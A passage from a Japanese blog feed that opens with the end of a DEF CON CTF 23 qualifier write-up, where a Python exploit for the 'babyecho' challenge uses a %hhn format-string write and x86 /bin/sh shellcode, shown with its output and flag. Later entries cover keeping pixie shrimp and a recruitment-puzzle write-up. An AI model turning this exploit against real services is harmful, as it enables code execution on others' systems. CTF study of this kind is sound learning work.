</span><span class='line'>    <span class="n">code</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">$ln</span><span class="se">\n</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">index</span> <span class="c"># write message text length = 4</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="c"># overwrite buffer</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># x86 /bin/sh shellcode</span>
</span><span class='line'>    <span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">addr_ret</span> <span class="o">=</span> <span class="n">addr_buf</span> <span class="o">-</span> <span class="mh">0x20</span>  <span class="c"># call return address = [esp]</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">payload</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr_ret</span><span class="p">)</span> \
</span><span class='line'>    <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr_ret</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> \
</span><span class='line'>    <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr_ret</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> \
</span><span class='line'>    <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr_ret</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> \
</span><span class='line'>    <span class="o">+</span> <span class="n">shellcode</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">addr_shell</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">&gt;&gt;</span> <span class="mi">0</span>  <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span>
</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>  <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span>
</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span>
</span><span class='line'>    <span class="n">addr_buf</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="p">]</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">c</span><span class="si">%%%d</span><span class="s">$hhn&quot;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr_shell</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span> <span class="n">index</span><span class="p">)</span> \
</span><span class='line'>    <span class="o">+</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">c</span><span class="si">%%%d</span><span class="s">$hhn&quot;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr_shell</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">addr_shell</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> \
</span><span class='line'>    <span class="o">+</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">c</span><span class="si">%%%d</span><span class="s">$hhn&quot;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr_shell</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="n">addr_shell</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> \
</span><span class='line'>    <span class="o">+</span> <span class="s">&quot;</span><span class="si">%%%d</span><span class="s">c</span><span class="si">%%%d</span><span class="s">$hhn&quot;</span> <span class="o">%</span> <span class="p">((</span><span class="n">addr_shell</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="n">addr_shell</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> \
</span><span class='line'>    <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c"># exploit</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;cat&lt;/home/babyecho/flag</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span> <span class="c"># capture the flag</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
</span><span class='line'>    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8192</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">exploit</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>実行結果は以下のとおりです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">Reading</span> <span class="mi">13</span> <span class="nb">bytes</span>
</span><span class='line'>
</span><span class='line'><span class="p">[</span><span class="n">DEBUG</span><span class="p">]</span> <span class="n">Buffer</span> <span class="n">address</span> <span class="o">=</span> <span class="mh">0xffbf62bc</span>
</span><span class='line'>
</span><span class='line'><span class="n">Reading</span> <span class="mi">1023</span> <span class="nb">bytes</span>
</span><span class='line'>
</span><span class='line'><span class="err">彙ｿ…</span> <span class="err">拊ｿ…</span> <span class="err">枌ｿ…</span> <span class="err">歟ｿ…</span> <span class="n">j</span>
</span><span class='line'><span class="n">X</span><span class="err">儚</span><span class="n">h</span><span class="o">//</span><span class="n">shh</span><span class="o">/</span><span class="nb">bin</span><span class="err">峨</span><span class="mi">1</span><span class="err">ﾉﾍ</span><span class="o">^</span>\
</span><span class='line'><span class="err">…</span>
</span><span class='line'>
</span><span class='line'>                                                               <span class="err">…</span>
</span><span class='line'><span class="n">The</span> <span class="n">flag</span> <span class="ow">is</span><span class="p">:</span> <span class="mi">1</span><span class="n">s</span> <span class="mi">1</span><span class="n">s</span> <span class="n">th3r3</span> <span class="n">th3r3</span> <span class="nd">@n</span> <span class="nd">@n</span> <span class="mi">3</span><span class="n">ch0</span> <span class="mi">3</span><span class="n">ch0</span> <span class="mi">1</span><span class="n">n</span> <span class="mi">1</span><span class="n">n</span> <span class="n">h3r3</span> <span class="n">h3r3</span><span class="err">?</span> <span class="mi">3</span><span class="n">uoiw</span><span class="err">!</span><span class="n">T0</span><span class="o">*%</span>
</span></code></pre></td></tr></table></div></figure>


<p>FLAG:<code>1s 1s th3r3 th3r3 @n @n 3ch0 3ch0 1n 1n h3r3 h3r3? 3uoiw!T0*%</code></p>

<p>今回の攻撃手法もIPAによって丁寧に解説及び対策が掲載されているので、詳しく知りたい場合は参考に見てみるのも良いでしょう。</p>

<p><a href="http://www.ipa.go.jp/security/awareness/vendor/programmingv2/contents/c906.html">IPA ISEC　セキュア・プログラミング講座：C/C++言語編　第10章 著名な脆弱性対策：フォーマット文字列攻撃対策</a></p>

<h1>その他</h1>

<p>Coding Challengeという、問題サーバーからレジスタの初期状態と機械語の命令コードが送られてきて、その命令を実行したあとのレジスタの値を送り返すという問題も解いたのですが、違う問題でglibcのアップデートをした際にマシンがクラッシュし、スナップショットの状態に戻した際に消えてしまいました。
なのでコードがありません。</p>

<h2>問題文</h2>

<pre><code>meow

catwestern_631d7907670909fc4df2defc13f2057c.quals.shallweplayaga.me
</code></pre>

<p>解法としては、Pythonで以下のように処理するものを作成して実行しただけです。</p>

<ol>
<li>レジスタの初期状態と機械語命令コードを受信＆パースする</li>
<li>Cのソースコードを生成

<ol>
<li>命令コードをunsigned char型配列に突っ込む</li>
<li>その配列を関数ポインタに変換</li>
<li>mprotectで配列の領域を実行可能に変更</li>
<li>asm volatile経由でレジスタの初期状態を書き込む</li>
<li>関数ポインタを呼び出し実行</li>
<li>asm volatile経由で実行後のレジスタの値を読み出す</li>
<li>標準出力に出力</li>
</ol>
</li>
<li>gccでソースコードをコンパイル</li>
<li>生成したバイナリを実行し、出力を得る</li>
<li>出力を送信</li>
</ol>


<p>となっています。
途中、mprotectに関してみむらさんからアドバイスをいただき、解くことができました。</p>

<p><a href="http://mimumimu.net/blog/2011/11/17/c%E3%82%B3%E3%83%BC%E3%83%89%E4%B8%AD%E3%81%AB%E3%83%9E%E3%82%B7%E3%83%B3%E8%AA%9E%E3%82%92%E5%9F%8B%E3%82%81%E8%BE%BC%E3%82%93%E3%81%A7%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B%E3%80%82/">Cコード中にマシン語を埋め込んで実行する。 | みむらの手記手帳</a></p>

<p>FLAG: <code>Cats with frickin lazer beamz on top of their heads!</code></p>

<p>追記：flag獲得者のみむらさんによるWrite-upが公開されています。</p>

<p><a href="https://mimumimu.net/blog/2015/05/19/defcon-ctf-23-quals-catwestern/">DEFCON CTF 23 Quals – catwestern Writeup | みむらの手記手帳</a></p>

<h1>まとめ</h1>

<p>チーム全体で計19ポイントを獲得し、結果33位でした。1ポイントしか貢献できませんでしたが、大人数でお互い協力して問題を解く楽しさを味わえてとても有意義でした。
また、問題傾向がPwn寄りであることから、もっとPwnに関する実力をつけなければならないと再確認できた良い機会でした。
来年は5ポイントを目標に挑みたいと思います！</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[えびの水槽引越しと環境整備と飼育について]]></title>
    <link href="http://mzyy94.com/blog/2015/04/29/ebi-the-move/"/>
    <updated>2015-04-29T15:03:01+09:00</updated>
    <id>http://mzyy94.com/blog/2015/04/29/ebi-the-move</id>
    <content type="html"><![CDATA[<p>小さくてかわいいピクシーシュリンプ（以下、えび）</p>

<p>かわいいえび特集第2弾です。</p>

<p>2月の寒い時期を乗り越えたえびたちは月が変わり3月に引越しをしました。引越しとともにえびの飼育環境の見直しや飼育設備の調整を行ったので、まとめることにしました。</p>

<!-- more -->


<h1>えびのお引越し</h1>

<p>この小さなえびは先日紹介したように、小さな瓶に入った状態で購入し、サーバーの中で飼っていました。
しかしサーバーの中は卓上と比べて薄暗く、単方向からしか鑑賞できないので机の上に移動させようと思い、引越しさせることにしました。</p>

<h2>えびの住環境見直し</h2>

<p>机の上に移動させることを考え始めたとき、小さな瓶に入ったえびたちを見て思うことがいくつかありました。</p>

<ul>
<li>「狭くないかなぁ」</li>
<li>「ちょっと殺風景だなぁ」</li>
<li>「食べ物とか大丈夫かなぁ」</li>
</ul>


<p>観賞魚（えび）だとはいえ、一緒に暮らす生き物です。このまま小瓶の中で飼い続けるのはえび達に申し訳なく思い、住環境を見直すことにしました。</p>

<h3>新しい水槽</h3>

<p>狭さへのストレス増加を危惧し、まずは大きな水槽へと移すことにしました。とは言ったものの、本格的な大きな水槽ではなく、今よりも4ｰ5倍広いものを想定して入れ物を探してみました。
えびの遊泳を妨げぬように形状は円柱もしくは角丸に限定し、なおかつ高透明度なアクリル製の容器を探していると、無印良品で良さそうなものを発見しました。</p>

<p><img src="http://img.muji.net/img/item/4934761479781_400.jpg" alt="アクリルポット 約直径８×高さ１１ｃｍ" /></p>

<p><a href="http://www.muji.net/store/cmdty/detail/4934761479781">アクリルポット 約直径８×高さ１１ｃｍ | 無印良品ネットストア</a></p>

<p>小瓶の4倍程度の大きさで透明度が高く、しっかりとした作りなので、えび水槽としても十分であると思い購入しました。</p>

<p>大きな水槽に移し替えるためには当然追加の水が必要となります。
このえび達は塩分濃度の低い海水、すなわち汽水で生活しているとのことなので、適切な濃度の汽水を用意しないといけません。
Amazon等で売ってる人工海水キットと比重計を買って汽水を作るのが一般的ですが、実はえびの購入時にマイクロウォーターなる専用の追加の汽水をいっしょに買っていたので、それをあたらしい水槽に追加することでより広い空間を泳げるようにしました。</p>

<p>大きな水槽に移すに伴いもう一つ必要となるものが、水槽に敷く砂利です。
えびは水質にとても敏感で、砂利の種類によっては水が弱アルカリ性に傾くことがあるようなので、影響が少ないであろうガラス製の人工砂を購入しました。
水槽に入れてから気づいたのですが、赤色の砂はえびの色とかぶってしまい、視認性が落ちます。</p>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.179123&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D179123"><img src="http://www.shopping-charm.jp/pic/179/179123-1.jpg" alt="クリスタルグラスサンド レッド／クリアー（約６０ｇ）" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.179123&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D179123">クリスタルグラスサンド レッド／クリアー（約６０ｇ）</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00U5OXGEI/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00U5OXGEI&amp;linkCode=as2&amp;tag=mzyy-22">クリスタルグラスサンド　レッド／クリアー（約６０ｇ）</a></li>
</ul>


<h3>えびの隠れ家</h3>

<p>引越しついでに殺風景だった水槽を彩るべくいろいろと必要なものを揃えました。</p>

<p>一番初めに準備したのはえびの隠れ家です。今までの小瓶には枝が1つと藻が1本入っているだけで、おちおちと休まることのできない環境だったので隠れ家を用意してあげようと思い立ちました。
えび用の隠れ家は何種類も売っていたのですが、どれもこの小さなえびには大きすぎるので、稚えび用の隠れ家を購入しました。</p>

<p><a href="http://www.amazon.co.jp/gp/product/B00R493S22/ref=as_li_ss_il?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00R493S22&amp;linkCode=as2&amp;tag=mzyy-22"><img src="http://ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;ASIN=B00R493S22&amp;Format=_SL250_&amp;ID=AsinImage&amp;MarketPlace=JP&amp;ServiceVersion=20070822&amp;WS=1&amp;tag=mzyy-22" alt="稚エビの隠れ家" /></a></p>

<ul>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00R493S22/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00R493S22&amp;linkCode=as2&amp;tag=mzyy-22">ウォーターエンジニアリング ベビー ビー シュリンプ シェルター (稚エビの隠れ家) 20個入り</a></li>
</ul>


<p>この隠れ家は明かりが十分にさす作りなので、暗い隠れ家も必要かと思い、エビ土管も購入しました。
これもサイズはいろいろとあったのですが、一番小さいものを選択しました。</p>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.87347&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D87347"><img src="http://www.shopping-charm.jp/pic/873/87347-1.jpg" alt="エビ土管 Ｓタイプ ５本入り" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.87347&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D87347">エビ土管 Ｓタイプ ５本入り</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00GTIL2PO/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00GTIL2PO&amp;linkCode=as2&amp;tag=mzyy-22">ミニテム エビ土管 Sタイプ</a></li>
</ul>


<h3>水草</h3>

<p>殺風景だった水槽も隠れ家によってだいぶ賑やかになってきました。
このえびはコケや藻やバクテリアを食して生きているとのことですが、瓶には目に見えないほど小さな藻が入っているだけだったので、彩りも兼ねてウィローモスを追加しました。
餌にも足場にもなる優秀な水草です。</p>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.472562&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D472562"><img src="http://www.shopping-charm.jp/pic/472/472562-1.jpg" alt="ウィローモス" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.472562&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D472562">（水草）ウィローモスｓｐ．（無農薬）（１カップ）　北海道航空便要保温</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00UF49ZRK/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00UF49ZRK&amp;linkCode=as2&amp;tag=mzyy-22">（水草）ウィローモスｓｐ．（無農薬）（１カップ）　北海道航空便要保温</a></li>
</ul>


<p>ウィローモスだけでも良かったのですが、アクアリウムショップに立ち寄った時に耐塩性マングローブの一種であるメヒルギを見つけたのでこれも購入し、水槽へと入れることにしました。</p>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.47168&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D47168"><img src="http://www.shopping-charm.jp/pic/471/47168-1.jpg" alt="メヒルギ" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.47168&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D47168">（観葉）メヒルギ（雌蛭木）の種（１本）北海道・九州・沖縄航空便要保温</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B00UF44M5U/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B00UF44M5U&amp;linkCode=as2&amp;tag=mzyy-22">（観葉）メヒルギ（雌蛭木）の種（１本）北海道・九州・沖縄航空便要保温</a></li>
</ul>


<p>物がそろったらいざ引越しです。小瓶内の水温と新しい水槽の水温がほぼ同じになるよう調節して、お互いの水をピペットで交換しつつ水質を近くしていき、水の準備をします。
そして、えびを瓶の中になだらかに流し込んであげて、引越しは完了です。</p>

<h4>Before</h4>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/29/before-shrimpbottle.jpg" alt="before" /></p>

<h4>After</h4>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/29/after-ebipot.jpg" alt="after" /></p>

<h1>えび飼育にあったほうがいいもの</h1>

<p>引越しをしてからかれこれ1ヶ月以上元気に育っています。飼育していて、あるとよいと気づいて購入した物がいくつかあったので紹介します。</p>

<h2>足し水</h2>

<p>密閉容器で飼育しているわけではないので、大気中に水分が蒸発していき水が減っていきます。
小瓶に付属していた飼い方説明書きには、減ってきたら専用のマイクロウォーターを追加してくださいと書いてあったのですが、汽水濃度が上がり続けることが心配になりました。
そこで、人工海水の作成時にも用いられる、海洋深層水をろ過したRO水を購入し、減った時には追加するようにしています。今回購入したRO水はもともと飲料水として販売している物なので、試しにコーヒーを淹れてみた所、すこし香りが増したような味わいになりました。</p>

<p><img src="http://ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;ASIN=B004ABND0Y&amp;Format=_SL250_&amp;ID=AsinImage&amp;MarketPlace=JP&amp;ServiceVersion=20070822&amp;WS=1&amp;tag=mzyy-22" alt="赤穂化成 純水 2000ml×6本" /></p>

<ul>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B004ABND0Y/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B004ABND0Y&amp;linkCode=as2&amp;tag=mzyy-22">赤穂化成 純水 2000ml×6本</a></li>
</ul>


<h2>エビ用のえさ</h2>

<p>えび達がウィローモスをつまつましている姿はたいへんかわいらしいのですが、心配性なのでお腹を空かせていないかとても気になりました。
えび用のえさは何十種類もあるのでどれがいいのかさっぱりでしたが、小さい顆粒で水に溶け出しにくい物をあげることにしました。
小さい顆粒と言っても一般的な鑑賞えびから見たら小さいということであって、この子たちには手で持つことができないサイズです。1粒を4つに割ってあげて、週に2回あげるようにしています。えさをあげる際は、食べ終わったらピペットで食べ残しを取り除いてあげないと水質が変化してしまったり、えび達に悪影響を与えかねないので注意が必要です。</p>

<p><a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.65799&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D65799"><img src="http://www.shopping-charm.jp/pic/657/65799-2.jpg" alt="ヌマエビの主食" /></a></p>

<ul>
<li>Charm: <a href="http://click.linksynergy.com/link?id=fUSw4lglgFk&amp;offerid=329184.65799&amp;type=2&amp;murl=http%3A%2F%2Fwww.shopping-charm.jp%2FItemDetail.aspx%3FitemId%3D65799">コメット ヌマエビの主食 沈下性 ４０ｇ</a></li>
<li>Amazon: <a href="http://www.amazon.co.jp/gp/product/B0051RIXU6/ref=as_li_ss_tl?ie=UTF8&amp;camp=247&amp;creative=7399&amp;creativeASIN=B0051RIXU6&amp;linkCode=as2&amp;tag=mzyy-22">ヌマエビの主食 40g</a></li>
</ul>


<h1>小さいえび飼育まとめ</h1>

<ul>
<li><strong>隠れ家は好みで</strong></li>
</ul>


<p>えびに隠れ家が必ず必要であるという確たる文献が見つからなかったので、殺風景だなと思ったら入れてあげる程度でいいかと思います。</p>

<ul>
<li><strong>水草は汽水でも生きる物を</strong></li>
</ul>


<p>当たり前のことですが、汽水に入れるので淡水でしか生息できない水草は枯れてしまい、水質を悪くし、えびのえさにすらならないのでご注意を。</p>

<ul>
<li><strong>汽水で生息</strong></li>
</ul>


<p>汽水の中でも比較的濃度の低い汽水で生活しているようです。また、餌やりしない場合は、水替えやフィルターなしで良いとのことです。人工海水キットで汽水を作る際は比重計とRO水の準備を忘れずに。</p>

<ul>
<li><strong>えさは不要</strong></li>
</ul>


<p>水槽に張り付いてコケを食べたり水草をつまつまする姿が見えるので追加でえさを入れなくても元気です。どうしても食べさせてあげたい時は小さめの物を。また、残飯を確実に回収すること。</p>

<ul>
<li><strong>水温は22℃前後</strong></li>
</ul>


<p>15℃以下30℃以上は生き辛いとのことなので、間をとって22℃を目標として飼育しています。今の所元気な姿が伺えます。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[小さなえびを飼い始めて2ヶ月が過ぎた]]></title>
    <link href="http://mzyy94.com/blog/2015/04/26/no-shrimp-no-life/"/>
    <updated>2015-04-26T23:46:19+09:00</updated>
    <id>http://mzyy94.com/blog/2015/04/26/no-shrimp-no-life</id>
    <content type="html"><![CDATA[<p>先日、久々にアイコンを大幅に変更しました。
MacBook Airとコーヒーと犬が描かれていたアイコンをここ数年使っていたのですが、
先月頭に起きた<a href="http://mzyy94.com/blog/2015/03/06/yuzu-trouble/">とある一件</a>のために柚子胡椒禁止アイコンが追加されるマイナーバージョンアップがあったくらいです。</p>

<blockquote class="twitter-tweet" lang="ja"><p>柚子胡椒 禁止アイコン <a href="http://t.co/FKXJYy96GN">pic.twitter.com/FKXJYy96GN</a></p>&mdash; プロ生ちゃん（暮井 慧） (@pronama) <a href="https://twitter.com/pronama/status/573812508881870849">2015, 3月 6</a></blockquote>


<p>そんなこんなでずっと同じアイコンを使っていたのですが、2月の中旬にえびを飼い始め、えびのことをたくさん呟き始めてきているのにアイコンにえびが写っていないのはいかがなものかと思っていたので、変更することにしました。そんなえびの話をします。</p>

<!-- more -->


<h1>えびとの出会い</h1>

<p>去る2015/02/15に東京スカイツリータウンへ行ったときのこと。ソラマチの中をブラブラとしていると、いろいろな雑貨を扱っているブースを見つけたので興味本位で立ち寄ってみました。ふと目に留まったのが手のひらサイズの小瓶。中に液体が入っているのが遠目でなんとか確認できるというものでしたが、近付いてみてびっくり、小さなかわいいえびがふわふわと泳いでいたのです。一円玉よりはるかに小さいえびがふわふわ漂う姿を目の当たりにした時、ビビッときました。一目惚れです。目尻が下がり、ドキドキしてしてました。しかし、その場ではすぐに買わず、ソラマチを再度ブラブラし始めました。</p>

<ul>
<li>餌やり不要</li>
<li>水替え不要</li>
<li>瓶のまま飼育可能</li>
<li>20℃前後の環境で飼育</li>
</ul>


<p>ブースに貼ってあったPopには確かこんなことが書いてありました。
果たしてちゃんと飼えるのだろうか、買われたことでえびたちは不幸になりやしないか。。などと考え1時間ほどソラマチを回って再度えびの前に戻ってきました。</p>

<p><strong>「幸せにしてあげるぞ！」</strong>そう意気込んで、ブースに来た時に最初に目が合ったえびのいる瓶を購入しました。</p>

<p><strong>2015/04/29追記：</strong>人気商品なためか、今月購入店を訪れた所、すでに売り切れていました。オンライン販売で入手できるかもです：<a href="http://www.love-marimo.com/shop/shop.html">まりも倶楽部通販</a></p>

<h1>えびの越冬</h1>

<p>飼い始めたえびは<em>ピクシーシュリンプ</em>（もしくはスカーレットシュリンプ、もしくはホロホロシュリンプ）という名の汽水に生息するとても小さなえびで、ハワイ原産とのことです。購入した小瓶には4匹入っていました。</p>

<p>小瓶に付属の飼い方説明書きには、15℃以下、30℃以上では生きていけないと記載がありました。購入した2月中旬の気温は15℃を下回っていたので、温める必要に迫られます。一人暮らしでハロゲンヒーターとコタツしか暖房器具がなく、どれも部屋中をあたためるのには不向きであり、かつ小瓶一つを温め続けるのも不可能であったため、違う熱源を利用しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>冬場の寒さから守るため、サーバーの中でエビを飼い始めました <a href="http://t.co/kZpvz90OPw">pic.twitter.com/kZpvz90OPw</a></p>&mdash; えび over HTTP/2 IPv6 (@mzyy94) <a href="https://twitter.com/mzyy94/status/566981294739820547">2015, 2月 15</a></blockquote>


<p>大抵の家庭にあるもう一つの暖房器具であるメディアストリーミングサーバーの中にすっぽりと収まったので、その中で冬の夜の寒い時間をしっかりと温まってもらおうとしました。
思惑は期待通りで、20℃前後の空間を作り上げることができ、2月の寒い時期を元気にすごしてくれました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/26/shrimp-in-the-server.jpg" alt="shrimp-in-the-server" /></p>

<h1>えびかわいいのでえび特集します</h1>

<p>ということで、えびかわいいので今週の記事はえび特集です。
3月になってからのえびの引越しやえびの飼育方法、えびかわいい動画撮影などの技術的な記事を書きます。
乞うご期待。</p>

<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ネットエージェント最終面接問題 Write-up エクストリームCTF編]]></title>
    <link href="http://mzyy94.com/blog/2015/04/16/netagent-mondai10/"/>
    <updated>2015-04-16T00:13:43+09:00</updated>
    <id>http://mzyy94.com/blog/2015/04/16/netagent-mondai10</id>
    <content type="html"><![CDATA[<p>ネットエージェントのいきなり最終面接問題を解いたのでWrite-upです。</p>

<ul>
<li><a href="http://www.netagent.co.jp/recruit/newgraduates_2016.html">2016年度 新卒採用｜ネットエージェント株式会社</a></li>
</ul>


<p>これまでmondai1からmondai9までは、mondaiとOS XやLinux、Windowsマシンが手元にあれば解く事ができていました。
しかしmondai10はそうはいきません。mondaiが手元にないのです。mondaiを入手しなければいけないのです。
某所で10分で解けたと言っていた人は、きっと某せんせーみたいにマッハ20で移動できるのでしょう。</p>

<p>ところで、こんな楽しい体験をさせてくれたmondaiを少しでもたくさんの人に知ってもらおうと、学内のLT大会で以下のように発表してきました。</p>

